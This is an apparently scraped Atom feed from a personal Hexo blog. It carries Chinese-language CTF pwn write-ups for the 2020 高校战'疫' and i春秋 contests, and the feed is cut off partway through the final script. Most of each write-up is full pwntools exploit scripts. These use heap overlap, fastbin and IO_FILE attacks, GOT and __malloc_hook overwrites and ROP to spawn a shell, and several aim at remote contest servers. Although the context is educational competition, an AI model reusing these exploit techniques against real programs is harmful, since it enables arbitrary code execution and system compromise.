<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-03-10T07:09:53.648Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020 i春秋公益赛pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/02/22/2020-i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9Bpwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/02/22/2020-i春秋公益赛pwn-writeup/</id>
    <published>2020-02-22T11:25:47.000Z</published>
    <updated>2020-02-23T03:57:12.783Z</updated>
    
    <content type="html"><![CDATA[<h2 id="force"><a href="#force" class="headerlink" title="force"></a>force</h2><p>标准的house of force，先申请较大的内存页，可泄露出libc基址，<br>然后申请较小堆块，溢出修改top chunk的size为0xffffffffffffffff,申请堆块到__malloc_hook附近，这里用onegadget，不满足条件，可修改为system函数，然后申请”/bin/sh”所在地址的堆块，即可getshell</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">offset = 0x4ff010#0x4aa010#0x4ec010#</span><br><span class="line">while True:</span><br><span class="line">warn(hex(offset))</span><br><span class="line">try:    </span><br><span class="line">    p = process(&apos;./pwn&apos;)</span><br><span class="line">    #p = remote(&apos;123.56.85.29&apos;,7147)</span><br><span class="line">    def add(size,content):</span><br><span class="line">        p.sendlineafter(&apos;1:&apos;,&apos;1&apos;)</span><br><span class="line">        